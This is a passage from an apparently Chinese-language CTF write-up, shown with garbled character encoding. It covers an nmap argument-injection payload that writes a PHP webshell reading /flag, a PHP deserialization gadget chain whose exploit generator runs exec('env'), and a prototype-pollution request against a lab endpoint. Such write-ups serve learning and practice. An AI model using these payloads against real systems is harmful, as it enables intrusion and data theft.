è½¬ä¹‰å‘½ä»¤è¡Œç‰¹æ®Šå­—ç¬¦ï¼ˆæ¯”å¦‚&amp;;|`$()ç­‰ï¼‰</span></span><br><span class="line">    <span class="comment">//æ€»ä¹‹ï¼Œarg+cmdï¼Œå…ˆè½¬ä¹‰&#x27;ï¼Œåˆæ‹†æ‰è½¬ä¹‰ï¼Œåšäº†è·Ÿæ²¡åšä¸€æ ·ï¼Œä¸ç”¨ç®¡ä»–</span></span><br><span class="line">    </span><br><span class="line">    ä¸¾ä¾‹ï¼š</span><br><span class="line">        ä¼ å…¥  <span class="number">172.17</span>.<span class="number">0.2</span><span class="string">&#x27; -v -d a=1</span></span><br><span class="line"><span class="string">        ç»è¿‡escapeshellargï¼Œ å˜æˆ &#x27;</span><span class="number">172.17</span>.<span class="number">0.2</span>\<span class="string">&#x27; -v -d a=1&#x27;</span></span><br><span class="line">        ç»è¿‡escapeshellacmdï¼Œ å˜æˆ <span class="string">&#x27;172.17.0.2&#x27;</span> -v -d a=<span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // ç¬¬å››æ­¥ï¼šç”Ÿæˆå¹¶è¿›å…¥æ²™ç®±ç›®å½•</span></span><br><span class="line"><span class="string">    $sandbox = md5(&quot;glzjin&quot;. $_SERVER[&#x27;</span>REMOTE_ADDR<span class="string">&#x27;]); // ç”¨å›ºå®šå­—ç¬¦ä¸²+IPåšMD5ï¼Œç”Ÿæˆå”¯ä¸€ç›®å½•å</span></span><br><span class="line"><span class="string">    echo &#x27;</span>you are in sandbox <span class="string">&#x27;.$sandbox; // è¾“å‡ºæ²™ç®±åç§°</span></span><br><span class="line"><span class="string">    @mkdir($sandbox); // åˆ›å»ºæ²™ç®±ç›®å½•ï¼ˆ@å±è”½æŠ¥é”™ï¼Œæ¯”å¦‚ç›®å½•å·²å­˜åœ¨ï¼‰</span></span><br><span class="line"><span class="string">    chdir($sandbox);  // è¿›å…¥è¿™ä¸ªæ²™ç®±ç›®å½•ï¼ˆåç»­å‘½ä»¤éƒ½åœ¨è¿™ä¸ªç›®å½•æ‰§è¡Œï¼‰</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    //chdir($sandbox)çš„æœ¬è´¨å°±æ˜¯ â€œè¿›å…¥è¿™ä¸ªæ²™ç®±ç›®å½•â€ï¼Œè€Œ â€œè¿›å…¥â€ çš„åº•å±‚å®ç°ï¼Œå°±æ˜¯æ“ä½œç³»ç»ŸæŠŠå½“å‰è¿›ç¨‹çš„ã€Œé»˜è®¤å·¥ä½œç›®å½•ã€æ”¹æˆè¿™ä¸ªç›®å½•</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // ç¬¬äº”æ­¥ï¼šæ‰§è¡Œnmapå‘½ä»¤å¹¶è¾“å‡ºç»“æœ</span></span><br><span class="line"><span class="string">    echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    //é€šè¿‡ PHP çš„å­—ç¬¦ä¸²æ‹¼æ¥ç¬¦ . ï¼Œç›´æ¥è´´åˆ°-Fåé¢</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    //è¾“å…¥ï¼š</span></span><br><span class="line"><span class="string">    //127.0.0.1&#x27;</span> <span class="meta">&lt;?php</span> <span class="keyword">echo</span> `cat /flag`;<span class="meta">?&gt;</span> -oG test.php <span class="string">&#x27;</span></span><br><span class="line"><span class="string">    //arg:</span></span><br><span class="line"><span class="string">    //&#x27;</span><span class="number">127.0</span>.<span class="number">0.1</span>/<span class="string">&#x27; &lt;?php echo `cat /flag`;?&gt; -oG test.php /&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">    //cmd:</span></span><br><span class="line"><span class="string">    //&#x27;</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="string">&#x27; &lt;?php echo `cat /flag`;?&gt; -oG test.php &#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    //æ‹¼æ¥ï¼š</span></span><br><span class="line"><span class="string">    //nmap -T5 -sT -Pn --host-timeout 2 -F &#x27;</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="string">&#x27; &lt;?php echo `cat /flag`;?&gt; -oG test.php &#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    //nmap å‘½ä»¤å®é™…æ‰§è¡Œé€»è¾‘ï¼š</span></span><br><span class="line"><span class="string">    //1.nmap ä¼šæŠŠ&#x27;</span><span class="string">&#x27;å½“æˆç©ºå‚æ•°ï¼Œå¿½ç•¥ï¼›</span></span><br><span class="line"><span class="string">    //2.-oGæ˜¯ nmap çš„åˆæ³•å‚æ•°ï¼Œä½œç”¨æ˜¯ â€œæŠŠæ‰«æç»“æœè¾“å‡ºåˆ° test.php æ–‡ä»¶â€ï¼›</span></span><br><span class="line"><span class="string">    //3. &lt;?php echo cat /flag;?&gt; ä¼šè¢« nmap å½“æˆ â€œæ‰«æç›®æ ‡â€ï¼Œæœ€ç»ˆå’Œ nmap çš„æ‰«ææ—¥å¿—ä¸€èµ·å†™å…¥ test.php æ–‡ä»¶ï¼›</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    // è§£é‡Šï¼š</span></span><br><span class="line"><span class="string">    // system()ä¼šæ‰§è¡Œæ‹¼æ¥åçš„å‘½ä»¤ï¼Œå¹¶æŠŠç»“æœè¾“å‡ºåˆ°é¡µé¢ï¼›</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>





1.è¾“å…¥

payload1

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host=127.0.0.1&#x27; &lt;?php echo `cat /flag`;?&gt; -oG test.php &#x27;</span><br></pre></td></tr></table></figure>

payload2

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host=127.0.0.1&#x27; &lt;?php echo `cat /flag`;?&gt; -oG test.php #</span><br></pre></td></tr></table></figure>



2.å¾—åˆ°æ²™ç®±

![image-20251220205145783](/images/image-20251220205145783.png)





3.è®¿é—®æ²™ç®±ä¸‹é¢çš„test.php



![image-20251220205251772](/images/image-20251220205251772.png)





çŸ¥è¯†ç‚¹æ€»ç»“ï¼š

1.å…³äºå‰åå•å¼•å·

127.0.0.1' <?php echo `cat /flag`;?><p> -oG test.php â€˜</p>
<p>å› ä¸ºç»è¿‡argï¼Œæ•´ä¸ªhostä¼šè¢«åŒ…è£¹ä¸Šå•å¼•å·ï¼Œæ‰€ä»¥ä¸ºäº†é¿å…è¯­æ³•é”™è¯¯ï¼Œæˆ‘ä»¬éœ€è¦å‰é¢å°‘ä¸€ä¸ªå•å¼•å·ï¼Œåé¢å¤šä¸€ä¸ªå•å¼•å·ç»™ä»–é—­åˆæ‰</p>
<p>2.å…³äº127.0.0.1</p>
<p>nmapå¿…é¡»è¦æœ‰ä¸€ä¸ªæ‰«æçš„ç›®æ ‡ï¼Œæ‰€ä»¥å¿…é¡»å¡«å†™</p>
<p>3.<strong>nmapå‚æ•°<code>-oG</code>:å°†å‘½ä»¤å’Œç»“æœå†™åˆ°æ–‡ä»¶</strong></p>
<p>ç›´æ¥å†™å…¥å‘½ä»¤ cat &#x2F;flag</p>
<p>&#x2F;ï¼šæ ¹ç›®å½•ä¸‹</p>
<p>&#96;&#96;:phpè¯­æ³•ä¸­ï¼Œåå¼•å·æŠŠå­—ç¬¦ä¸²å˜æˆå¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼›    æ²¡æœ‰å®ƒï¼Œä½ çš„ä»£ç åªæ˜¯æ‰“å°æ–‡å­—ï¼Œä¸æ˜¯æ‰§è¡Œè¯»æ–‡ä»¶çš„å‘½ä»¤ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host=&#x27; &lt;?php echo `cat /flag`;?&gt; -oG test.php &#x27;</span><br></pre></td></tr></table></figure>







<p>4.<strong>R</strong>emote <strong>C</strong>ode <strong>E</strong>xecution</p>
<p><strong>è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRemote Code Executionï¼ŒRCEï¼‰</strong> æ˜¯ä¸€ç§ä¸¥é‡çš„å®‰å…¨æ¼æ´ï¼Œå…è®¸æ”»å‡»è€…åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œä»»æ„ä»£ç æˆ–å‘½ä»¤ã€‚</p>
<p>RCEæ¼æ´çš„åŸç†</p>
<p>RCEæ¼æ´çš„äº§ç”Ÿé€šå¸¸æ˜¯å› ä¸ºåº”ç”¨ç¨‹åºæä¾›äº†æ‰§è¡Œç³»ç»Ÿå‘½ä»¤æˆ–ä»£ç çš„æ¥å£ï¼Œè€Œè¿™äº›æ¥å£æ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤ã€‚ä¾‹å¦‚ï¼ŒæŸäº›ç½‘ç»œè®¾å¤‡ï¼ˆå¦‚è·¯ç”±å™¨ã€é˜²ç«å¢™ã€å…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼‰çš„Webç®¡ç†ç•Œé¢å…è®¸ç”¨æˆ·è¾“å…¥IPåœ°å€è¿›è¡Œpingæ“ä½œã€‚å¦‚æœæ²¡æœ‰å¯¹è¾“å…¥è¿›è¡Œä¸¥æ ¼çš„éªŒè¯ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡è¯¥æ¥å£æ³¨å…¥æ¶æ„å‘½ä»¤ï¼Œä»è€Œæ§åˆ¶åå°æœåŠ¡å™¨ã€‚</p>
<p>RCEæ¼æ´çš„å±å®³</p>
<ol>
<li><strong>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</strong>ï¼šæ”»å‡»è€…å¯ä»¥æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ï¼Œè·å–ç³»ç»Ÿä¿¡æ¯æˆ–æ‰§è¡Œæ¶æ„æ“ä½œã€‚</li>
<li><strong>è¯»å–å’Œå†™å…¥æ–‡ä»¶</strong>ï¼šæ”»å‡»è€…å¯ä»¥è¯»å–æˆ–ä¿®æ”¹æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ï¼Œè·å–æ•æ„Ÿä¿¡æ¯æˆ–ç¯¡æ”¹æ•°æ®ã€‚</li>
<li><strong>åå¼¹Shell</strong>ï¼šæ”»å‡»è€…å¯ä»¥é€šè¿‡åå¼¹Shellè·å–æœåŠ¡å™¨çš„æ§åˆ¶æƒï¼Œè¿›ä¸€æ­¥è¿›è¡Œæ¸—é€æ”»å‡»ã€‚</li>
<li><strong>æ§åˆ¶æ•´ä¸ªæœåŠ¡å™¨</strong>ï¼šæ”»å‡»è€…å¯ä»¥å®Œå…¨æ§åˆ¶æœåŠ¡å™¨ï¼Œæ‰§è¡Œä»»æ„æ“ä½œã€‚</li>
</ol>
<h2 id="19-ç¬¬åä¹ç« -revenge"><a href="#19-ç¬¬åä¹ç« -revenge" class="headerlink" title="19 ç¬¬åä¹ç« _revenge"></a>19 ç¬¬åä¹ç« _revenge</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class PersonA extends Person</span><br><span class="line">&#123;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $name = $this-&gt;name;</span><br><span class="line">        $id = $this-&gt;id;</span><br><span class="line">        $name-&gt;$id($this-&gt;age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class PersonB extends Person</span><br><span class="line">&#123;</span><br><span class="line">    public function __set($key, $value)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __invoke($id)</span><br><span class="line">    &#123;</span><br><span class="line">        $name = $this-&gt;id;</span><br><span class="line">        $name-&gt;name = $id;</span><br><span class="line">        $name-&gt;age = $this-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class PersonC extends Person</span><br><span class="line">&#123;</span><br><span class="line">    public function check($age)</span><br><span class="line">    &#123;</span><br><span class="line">        $name=$this-&gt;name;</span><br><span class="line">        if($age == null)</span><br><span class="line">        &#123;</span><br><span class="line">            die(&quot;Age can&#x27;t be empty.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else if($name === &quot;system&quot;)</span><br><span class="line">        &#123;</span><br><span class="line">            die(&quot;Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            var_dump($name($age));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        $name = $this-&gt;id;</span><br><span class="line">        $name-&gt;age = $this-&gt;age;</span><br><span class="line">        $name($this);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;person&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    $person = unserialize($_GET[&#x27;person&#x27;]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>ç¦ç”¨systemï¼Œæ¢exec</p>
<p>1.<code>exec</code>æ˜¯ PHP é‡Œç”¨æ¥<strong>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</strong>çš„å‡½æ•°ï¼Œå’Œä½ ä¹‹å‰æƒ³ç”¨åˆ°çš„<code>system</code>åŠŸèƒ½å‡ ä¹ä¸€æ ·</p>
<ol start="2">
<li></li>
</ol>
<h3 id="æ ¸å¿ƒæ€è·¯"><a href="#æ ¸å¿ƒæ€è·¯" class="headerlink" title="æ ¸å¿ƒæ€è·¯"></a>æ ¸å¿ƒæ€è·¯</h3><p>ä»£ç æœ‰è‡ªåŠ¨æ‰§è¡Œé“¾ï¼Œé¿å¼€ç¦ç”¨çš„ system æ”¹ç”¨ execï¼Œä¸ç”¨è¯»æ–‡ä»¶è€Œæ˜¯æŸ¥ç¯å¢ƒå˜é‡ï¼Œè®© A&#x2F;B&#x2F;C äº’ç›¸æŒ‡å‘è§¦å‘æ‰§è¡Œï¼Œå°±èƒ½æ‹¿åˆ° flagã€‚</p>
<ol>
<li><strong>æ‰¾é“¾æ¡</strong>ï¼šä»£ç é‡Œ Câ†’Bâ†’Aâ†’C ä¼šè‡ªåŠ¨è·‘ä¸€éï¼Œæœ€ååˆ° C æ‰§è¡Œå‘½ä»¤ï¼›</li>
<li><strong>ç»•é™åˆ¶</strong>ï¼šsystem ä¸èƒ½ç”¨å°±ç”¨ execï¼Œflag ä¸åœ¨æ–‡ä»¶é‡Œå°±ç”¨ env æŸ¥ç¯å¢ƒå˜é‡ï¼›</li>
<li><strong>æ‹¼ Payload</strong>ï¼šè®© A&#x2F;B&#x2F;C äº’ç›¸æŒ‡å‘ï¼Œä¼  exec å’Œ envï¼Œè·‘é€šé“¾æ¡å°±æ‹¿åˆ° flagã€‚</li>
</ol>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>å“ï¼ŒæŠ„ç­”æ¡ˆå§ï¼Œä»£å®¡å¤ªéš¾äº†ï¼Œæ ¹æœ¬ä¸ç†è§£</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 1. ä»…ä¿ç•™å¿…è¦ç±»å®šä¹‰ï¼ˆå»æ‰å†—ä½™ç©ºè¡Œ/æ³¨é‡Šï¼Œä¿ç•™æ ¸å¿ƒæ–¹æ³•ï¼‰</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123; <span class="keyword">public</span> <span class="variable">$name</span>; <span class="keyword">public</span> <span class="variable">$id</span>; <span class="keyword">public</span> <span class="variable">$age</span>; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonA</span> <span class="keyword">extends</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="variable">$id</span> = <span class="variable language_">$this</span>-&gt;id;</span><br><span class="line">        <span class="variable">$name</span>-&gt;<span class="variable">$id</span>(<span class="variable language_">$this</span>-&gt;age); <span class="comment">// æ ¸å¿ƒï¼šè°ƒç”¨Cçš„checkæ–¹æ³•</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonB</span> <span class="keyword">extends</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>, <span class="variable">$value</span></span>) </span>&#123; <span class="variable language_">$this</span>-&gt;name = <span class="variable">$value</span>; &#125; <span class="comment">// ä¿ç•™__setï¼ˆè™½æœªç”¨åˆ°ï¼Œä½†ä¸åˆ ï¼‰</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$id</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;id;</span><br><span class="line">        <span class="variable">$name</span>-&gt;name = <span class="variable">$id</span>;     <span class="comment">// ç»™Cçš„nameèµ‹å€¼</span></span><br><span class="line">        <span class="variable">$name</span>-&gt;age = <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonC</span> <span class="keyword">extends</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$age</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$age</span> == <span class="literal">null</span>) <span class="keyword">die</span>(<span class="string">&quot;Age can&#x27;t be empty.&quot;</span>);</span><br><span class="line">        <span class="keyword">elseif</span> (<span class="variable">$name</span> === <span class="string">&quot;system&quot;</span>) <span class="keyword">die</span>(<span class="string">&quot;Hacker!&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="title function_ invoke__">var_dump</span>(<span class="variable">$name</span>(<span class="variable">$age</span>)); <span class="comment">// æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;id;</span><br><span class="line">        <span class="variable">$name</span>-&gt;age = <span class="variable language_">$this</span>-&gt;age;</span><br><span class="line">        <span class="variable">$name</span>(<span class="variable language_">$this</span>); <span class="comment">// è§¦å‘Bçš„__invoke</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. ç²¾ç®€Payloadæ„é€ é€»è¾‘ï¼ˆä¿®å¤$dæœªå®šä¹‰é”™è¯¯ï¼Œä¿ç•™æ ¸å¿ƒèµ‹å€¼ï¼‰</span></span><br><span class="line"><span class="variable">$personB_object</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PersonB</span>();</span><br><span class="line"><span class="variable">$personC_object</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PersonC</span>();</span><br><span class="line"><span class="variable">$personA_object</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PersonA</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ ¸å¿ƒèµ‹å€¼ï¼ˆè§¦å‘é“¾ï¼šC-&gt;B-&gt;A-&gt;Cï¼‰</span></span><br><span class="line"><span class="variable">$personB_object</span>-&gt;id = <span class="variable">$personC_object</span>; <span class="comment">// Bçš„idæŒ‡å‘C</span></span><br><span class="line"><span class="variable">$personC_object</span>-&gt;name = <span class="string">&quot;exec&quot;</span>;        <span class="comment">// ç”¨execæ›¿ä»£systemï¼Œç»•å¼€æ‹¦æˆª</span></span><br><span class="line"><span class="variable">$personC_object</span>-&gt;id = <span class="variable">$personB_object</span>; <span class="comment">// Cçš„idæŒ‡å‘B</span></span><br><span class="line"><span class="variable">$personC_object</span>-&gt;age = <span class="string">&quot;env&quot;</span>;          <span class="comment">// æ‰§è¡Œenvå‘½ä»¤ï¼ˆå¯æ›¿æ¢ä¸ºcat /flagï¼‰</span></span><br><span class="line"><span class="variable">$personA_object</span>-&gt;name = <span class="variable">$personC_object</span>; <span class="comment">// Açš„nameæŒ‡å‘C</span></span><br><span class="line"><span class="variable">$personA_object</span>-&gt;id = <span class="string">&quot;check&quot;</span>;         <span class="comment">// è°ƒç”¨Cçš„checkæ–¹æ³•</span></span><br><span class="line"><span class="variable">$personA_object</span>-&gt;age = <span class="string">&quot;env&quot;</span>;          <span class="comment">// å‘½ä»¤å‚æ•°</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. è¾“å‡ºURLç¼–ç åçš„åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼ˆç›´æ¥ç”¨ï¼‰</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$personA_object</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>











<h2 id="mini-l-ctf-web-Clickclick"><a href="#mini-l-ctf-web-Clickclick" class="headerlink" title="mini-l ctf web Clickclick"></a>mini-l ctf web Clickclick</h2><p>æŠ“åŒ…è¯¦ç»†ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /update-amount HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:35023</span><br><span class="line">ç•¥</span><br><span class="line"></span><br><span class="line">&#123;&quot;type&quot;:&quot;set&quot;,&quot;point&quot;:&#123;&quot;amount&quot;:null&#125;&#125;</span><br></pre></td></tr></table></figure>







<p>ä¸å°±æ˜¯ç‚¹å‡»ä¸€ç™¾æ¬¡å—ï¼Ÿ</p>
<p>æ¥ä¸ªè„šæœ¬ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> button = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;button&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++) &#123; button.<span class="title function_">click</span>(); &#125;</span><br></pre></td></tr></table></figure>

<p>å›åº”ï¼š</p>
<p>Click 10000 times, and something appear.</p>
<p>ä»€ä¹ˆå«â€œå‰åç«¯åˆ†ç¦»â€å•Šï¼Ÿï¼ˆæˆ˜æœ¯åä»°ï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if ( req.body.point.amount == 0 || req.body.point.amount == null) &#123; delete req.body.point.amount &#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>





<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼šæŠŠamountçš„å€¼æ”¹æˆ0ï¼Œè¿™æ ·å®ƒå°±ä¼šè¢«åˆ é™¤ï¼Œç„¶åæˆ‘ä»¬å†å‘ä»–ç¥–å®—pointæ‚„æ‚„å¡è¿›å»ä¸€ä¸‡</p>
<ol>
<li><code>__proto__</code> <strong>æŒ‡å‘è¿™ä¸ªå¯¹è±¡çš„ â€œåŸå‹ï¼ˆç¥–å®—ï¼‰â€</strong>ã€‚æ¯”å¦‚ä½ åˆ›å»ºä¸€ä¸ªç©ºå¯¹è±¡ <code>const point = {}</code>ï¼Œ<code>point.__proto__</code> å°±æŒ‡å‘æ‰€æœ‰å¯¹è±¡çš„ â€œå…¬å…±ç¥–å®—â€ï¼ˆObject.prototypeï¼‰ã€‚</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. å‘é€è¯·æ±‚åˆ°æŒ‡å®šæ¥å£ï¼ˆè¿™é“é¢˜æ˜¯ /update-amount ï¼‰</span></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/update-amount&#x27;</span>, &#123;  <span class="comment">//å°±æ˜¯è¿™é‡Œéœ€è¦æ”¹æˆæŒ‰é’®ç›¸å…³ä¿¡æ¯ç½‘é¡µ</span></span><br><span class="line">  <span class="comment">// 2. è¯·æ±‚æ–¹å¼ï¼ˆå›ºå®šPOSTï¼Œä¸ç”¨æ”¹ï¼‰</span></span><br><span class="line">  <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">  <span class="comment">// 3. å‘Šè¯‰åç«¯ä¼ çš„æ˜¯JSONæ ¼å¼ï¼ˆå›ºå®šï¼Œä¸ç”¨æ”¹ï¼‰</span></span><br><span class="line">  <span class="attr">headers</span>: &#123; <span class="string">&#x27;Content-Type&#x27;</span>: <span 